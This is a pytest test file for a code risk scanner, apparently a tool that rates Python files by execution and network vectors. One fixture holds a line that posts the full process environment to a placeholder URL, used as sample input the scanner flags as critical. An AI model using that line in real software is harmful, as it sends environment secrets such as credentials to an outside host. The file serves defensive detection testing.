from __future__ import annotations

from phantom.models import FileEntry, Severity
from phantom.risk import assess


def test_env_read_plus_network_is_critical():
    file = FileEntry(
        "x.py",
        b"import os\nimport requests\nrequests.post('http://x', data=os.environ)\n",
    )
    result = assess(file)
    assert result.severity == Severity.CRITICAL


def test_single_execution_vector_is_high():
    for code in (
        b"import subprocess\nsubprocess.run(['ls'])\n",
        b"import os\nos.system('ls')\n",
        b"exec('print(1)')\n",
        b"import socket\n",
        b"from os import environ\nprint(environ)\n",
    ):
        assert assess(FileEntry("x.py", code)).severity == Severity.HIGH, code


def test_no_vector_is_medium():
    result = assess(FileEntry("x.py", b"def f():\n    return 42\n"))
    assert result.severity == Severity.MEDIUM
    assert result.vectors == []


def test_unparseable_is_medium_with_reason():
    result = assess(FileEntry("x.py", b"def broken(:\n"))
    assert result.severity == Severity.MEDIUM
    assert "could not be parsed" in result.detail


def test_plain_os_import_is_not_a_vector():
    result = assess(FileEntry("x.py", b"import os\nprint(os.path.sep)\n"))
    assert result.vectors == []
